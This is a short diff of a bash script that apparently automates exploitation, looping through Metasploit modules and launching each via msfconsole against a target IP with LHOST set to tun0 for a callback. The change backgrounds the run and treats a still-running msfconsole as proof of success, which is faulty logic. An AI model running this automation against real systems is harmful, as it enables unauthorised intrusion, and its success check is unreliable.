@@ -159,8 +159,9 @@ do
             # Loop through the exploits and attempt to use them
             for exploit in "${exploits[@]}"; do
                 echo "Using exploit $exploit"
-                msfconsole -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run"
-                if [ $? -eq 0 ]
+                msfconsole -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" &
+                sleep 10 # Wait for the exploit to execute
+                if pgrep msfconsole > /dev/null
                 then
                     echo "Exploited vulnerability $vuln using exploit $exploit"
                     exploitsFound=1
